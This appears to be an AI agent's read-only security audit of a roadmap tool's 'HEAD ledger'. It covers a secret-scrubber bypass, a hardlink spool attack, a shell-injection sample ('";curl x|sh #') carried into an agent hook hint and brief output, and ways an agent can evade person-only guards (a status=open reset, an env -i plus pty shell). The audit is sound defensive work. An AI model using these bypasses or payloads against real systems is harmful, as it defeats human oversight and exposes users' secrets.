Read-only review of the HEAD ledger. I'll read the listed files and trace secret handling, locks, hooks, and the view.

Skill is for `/review-security` diffs, not this file-scoped review. Reading the HEAD ledger code next.

`head.js` changed while I was reading it. Re-reading the current view and the person-only paths.

Read-only review of the HEAD ledger. Findings below, highest severity first. Phone cannot call `head.accept`, `head.review`, `head.forget`, or `head.set` (`PHONE_OPS` in `roadmap/http/security.py`, enforced at `roadmap/http/routes.py:252`). The agent CLI can.

## 1. High — secrets that miss the scrubber are written into committed `docs/head-text.jsonl`

`roadmap/core/secrets.py:38-42` keeps a 32+ character run when it has no digit, no letter, or is exactly 40 hex. `roadmap/core/secrets.py:27-28` only matches `password|token|secret|key` (and `api_key` / `access_key`) with a word boundary immediately before that word.

`AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` stays intact: `_` is a word character, so `\bkey` does not fire, and the value has no digit so `_opaque` returns it unchanged. The same hole keeps any 40-hex token (treated as a git sha) and any long letter-only token. A multi-word value stops at the first space (`password=my secret` becomes `password=[secret] secret`). `.` is outside the opaque alphabet, so a dotted token (`ya29.…`) is stored in pieces.

`roadmap/services/head.py:58-60` scrubs, then `roadmap/services/head.py:105` appends that string to `head-text.jsonl`. `.gitignore:8` ignores only `docs/head-spool.jsonl`. Section 10 of the spec says `docs/head-text.jsonl` is committed. The same text is also stored, cut to 100 characters, as `sum` in `head.jsonl` (`roadmap/services/head.py:63-66`), reprinted by `brief` (`roadmap/services/head.py:291-296`), and sent to the phone inside the row. `GET …/head?full=` omits verbatim text for the phone (`roadmap/http/routes.py:565-571`); it does not omit `sum`.

Fix: mask every 32+ run of that alphabet, including digit-free and 40-hex runs (keep a sha only when it is clearly a commit id). Match `KEY|SECRET|TOKEN|PASSWORD` with optional suffix before `=` or `:`, and take a quoted value to the closing quote. Scrub `sum` with the same rules. Keep verbatim text out of git if a miss must not become a public commit.

## 2. High — `head.forget` leaves the secret in the committed file

`roadmap/services/headops.py:401-406` appends `{"id","text":""}` and does not rewrite the file. `roadmap/services/head.py:255-261` shows the last line only, so the UI looks empty while every older line, including the secret, stays in `head-text.jsonl` and in git history.

Fix: under the directory lock, rewrite `head-text.jsonl` and drop every line for that id. An append of `""` is not a delete. If the file was already committed, rotate or filter git history.

## 3. High — spool hardlink (and symlink race) corrupts an arbitrary file, then copies unsanitized spool text into the ledger

`roadmap/services/head.py:113-117` refuses a symlink, then `open`s without `O_NOFOLLOW`. A hardlink is not a symlink. `O_APPEND` writes the spool line into the target inode. `roadmap/services/head.py:133-154` then opens that same inode, and on any content `truncate`s it to empty. A local agent can `ln` a file on the same volume (a key file, `docs/head-text.jsonl`, a doc) to `head-spool.jsonl`. The next locked head write appends into it and then wipes it.

`roadmap/services/head.py:149` adopts `payload["text"]` with no second `scrub`. A hand-written spool line is copied into `head-text.jsonl` and `head.jsonl`. `roadmap/store/jsonl.py:16-28` has the same check-then-open race on `head-text.jsonl` itself.

Fix: open with `O_NOFOLLOW`, require a regular file with `nlink == 1` whose parent is the data dir, and compare `lstat` to `fstat`. Re-scrub on adopt. Swap the spool aside with `rename` instead of truncating in place.

## 4. High — an agent clears a person-only accept or reopen without `person_context`

`roadmap/services/headops.py:124-127` guards only `head.review`, `head.accept`, and `head.forget`. `roadmap/services/headops.py:252-263` (`head.set`) and `roadmap/services/headops.py:236-246` (`head.triage`, always `by="head"`) accept every status in `roadmap/core/head.py:15`, including `open`. `roadmap/core/head.py:214-218` stores the latest manual status. `open` is not a closed status (`roadmap/core/head.py:129-145`), so it replaces a person’s `("done","person")` mark. `roadmap/core/snapshot.py:220-228` then drops `acc`. From an agent shell, `roadmap head set H1 status=open` undoes accept. `status=declined|merged|needs-you|done` is the same path. `done` from an agent does not set `by=person`, so it does not forge the accept flag. It does close the row.

The GUI does not use the person-only op. `web/js/views/head.js:366-370` posts `head.set` with `{set:{status}}`. `_check_set` reads top-level `status` (`roadmap/services/headops.py:252`, `roadmap/services/commands.py:43-44`). Nested `set` is ignored, the op returns “needs at least one of status, kind, sum, note”, and Reopen / Needs you / Decline from the page do not run. Accept does: `web/js/views/head.js:364` calls `head.accept`.

A second bypass reaches accept and forget: `roadmap/services/agentguard.py:84-94` treats a `cli` caller as the person when stdin and stdout are TTYs and no agent env marker is set. `source_name` only special-cases `CLAUDECODE` (`roadmap/services/agentguard.py:43-56`). `env -i` plus a pty is `person_context`. Localhost can also spoof `Origin` and `Sec-Fetch-Site` (`roadmap/http/security.py:94-102`); that still needs the CSRF token.

Fix: require `person_context` for `status=open` and for any update that changes a row whose last mark is `("done","person")`. Keep decline / merge / needs-you on that rule if only the person may close or reopen. Point the GUI at `head.review` with top-level `action`, or at `head.set` with top-level `status`. Treat a pty-and-clean-env shell as an agent, or require the browser proof for accept, review, and forget.

## 5. Medium — the 0.3s hook budget does not fail open

`roadmap/services/hooks.py:326` sets `PRE_TIMEOUT_S = 0.3`. `roadmap/services/hooks.py:559` uses half of whatever is left, and only as the directory-lock wait. If that lock is busy, `roadmap/services/head.py:117-119` then takes `flock(LOCK_EX)` on the spool with no timeout. Adopt holds that flock while it re-reads `head.jsonl` and fsyncs once per spooled line (`roadmap/services/head.py:136-154`). The hook blocks in that wait. `roadmap/services/hooks.py:219-232` returns `None` only after the call returns or raises. A stuck flock never raises, so UserPromptSubmit stalls the prompt.

If the directory lock is free, timeout `0` still enters the critical section (`roadmap/store/lock.py:39-42`) and capture, adopt, and `_untriaged` (`roadmap/services/hooks.py:577`) run with no deadline.

Fix: one deadline around the whole UserPromptSubmit path. Use `LOCK_NB` or a timed flock for the spool. Past the deadline, return `None` and leave the prompt unlogged. Do not call `rows()` after the deadline.

## 6. Medium — adopt deletes spool lines it did not write, and a crash replays the ones it did

`roadmap/services/head.py:149-154`: the first `RoadmapError` from `_append_entry_locked` (cap, or `head.jsonl` / `head-text.jsonl` refused as a symlink) `break`s, then `seek(0)` / `truncate()` drops every later line. The return count is discarded (`roadmap/services/head.py:182`). A crash after those lines are fsynced into `head.jsonl` and before truncate leaves them in the spool; the next adopt assigns new ids and duplicates them.

Fix: on failure, write the unprocessed tail back (or `rename` a remainder into place). Record adopted ids so a replay is idempotent.

## 7. Medium — ask text is interpolated into a shell-shaped hook hint and into later `brief` output

`roadmap/services/hooks.py:597-600` builds `additionalContext` as `roadmap head t H12 ask "<sum>"`. `roadmap/services/head.py:63-66` collapses whitespace and scrubs, and it keeps `"`, `$`, and backticks. A prompt of at least four words (`roadmap/services/hooks.py:566`) whose first clause is `please fix export ";curl x|sh #` is enough for the hint to become two shell commands if the agent runs that line. The hook does not exec it. The same `sum` is stored and later printed by `brief` (`roadmap/services/head.py:291-296`) and by `roadmap head list`, so a committed `head.jsonl` line is replayed into the next head turn.

Fix: stop embedding `sum` in a command string. If the hint must include it, use `shlex.quote`. Print brief rows as data, with a fixed prefix, and do not tell the agent to execute them.

## 8. Low — view markup is escaped; one selector is not

Text, titles, `href`s, and `data-*` values in `web/js/views/head.js` go through `esc()` (`web/js/dom.js:7-14`), including verbatim text (`web/js/views/head.js:259`). I did not find an HTML breakout. `web/js/views/head.js:385` builds a selector with raw `data-id`:

`document.querySelector('[data-action="head-toggle"][data-id="' + id + '"]')`

`roadmap/core/head.py:167` accepts any string id. A crafted `head.jsonl` id that contains `"` changes the selector. Capture itself only mints `H` + digits.

Fix: allow only `^H[1-9][0-9]{0,3}$` before that lookup, or use `CSS.escape`.

## 9. Low — “masks are never split” and mode `0600` do not hold for the committed file

`roadmap/services/head.py:58-60` slices at 8000 after scrub, so a `[secret]` token on that boundary is cut in half. The secret is already replaced; the mask is not atomic. `roadmap/store/jsonl.py:22-28` creates the file mode `0666 & ~umask` (usually `0644`) and `chmod`s `0600` only when this process created it. Git stores `100644`, and a checkout never hits that `chmod`. Mode `0600` does not protect a committed `head-text.jsonl`.

Fix: cut on a character boundary that does not bisect a mask. Treat `0600` as local-only and do not rely on it once the file is in git.

